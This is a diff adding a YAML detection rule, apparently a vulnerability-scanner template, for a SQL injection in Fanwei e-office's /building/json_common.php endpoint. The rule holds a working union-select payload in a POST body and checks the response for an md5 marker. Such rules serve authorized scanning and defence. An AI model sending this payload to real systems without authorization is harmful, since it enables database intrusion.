@@ -1,0 +1,11 @@
+cve-id: fanwei-eoffice-json-common-sqli
+rules:
+- method: POST
+  path: /building/json_common.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  body: tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(102103122)
+    ,4#|2|333
+  expression: 'response.status ==  200 && response.body.bcontains(b"6cfe798ba8e5b85feb50164c59f4bec9") '
+severity: critical
+type: sqli
